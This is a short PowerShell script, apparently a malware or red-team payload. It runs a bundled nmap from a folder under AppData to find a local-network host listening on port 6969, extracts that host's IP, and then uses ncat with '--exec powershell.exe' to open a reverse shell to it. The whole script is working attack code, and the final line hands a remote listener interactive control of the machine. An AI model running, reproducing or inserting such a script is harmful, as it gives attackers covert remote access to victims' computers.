# change directory into nmap folder
Write-Output "Changing Directory"
Set-Location -Path "$($env:APPDATA)\Fairy\nmap"
Write-Output "Directory Changed"

# scan for listening port 6969 on network
Write-Output "Scanning for port"
$ScanOutput = .\nmap.exe -p 6969 -T5 -n 192.168.1.0/24 --open
Write-Output "Scan Finished"

# get ip of listener
Write-Output "Getting IP"
$string = $ScanOutput -match "192\.168\..+"
$ListenerIP = $string.Substring(21)
Write-Output "IP Extracted"

# connect to listener
Write-Output "Connecting to listener"
.\ncat.exe -C --exec "powershell.exe" $ListenerIP 6969

